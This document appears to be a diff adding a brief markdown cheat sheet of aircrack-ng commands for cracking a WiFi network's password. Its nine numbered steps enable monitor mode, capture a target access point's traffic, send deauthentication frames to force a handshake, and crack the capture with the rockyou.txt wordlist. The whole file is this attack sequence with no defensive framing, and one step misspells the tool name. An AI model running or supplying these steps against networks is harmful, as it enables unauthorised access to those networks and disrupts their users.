@@ -1,0 +1,13 @@
+##Aircrack-ng
+ 
+1. iwconfig
+2. sudo airmon-ng start "wlan-name"
+3. iwconfig
+4. sudo airodump-ng "wlan-name"
+5. sudo airodump-ng --bssid "wifi-MAC-address" -c "channel-no." "wlan-name" --write /tmp/filename
+at another terminal
+6. sudo airplay-ng --deauth "times" -a "wifi-MAC-address" "waln-name"
+at orginal terminal
+7. Ctrl+C
+8. aircrack-ng /tmp/filename.cap
+9. aircrack-ng /tmp/filename.cap -w /location/rockyou.txt
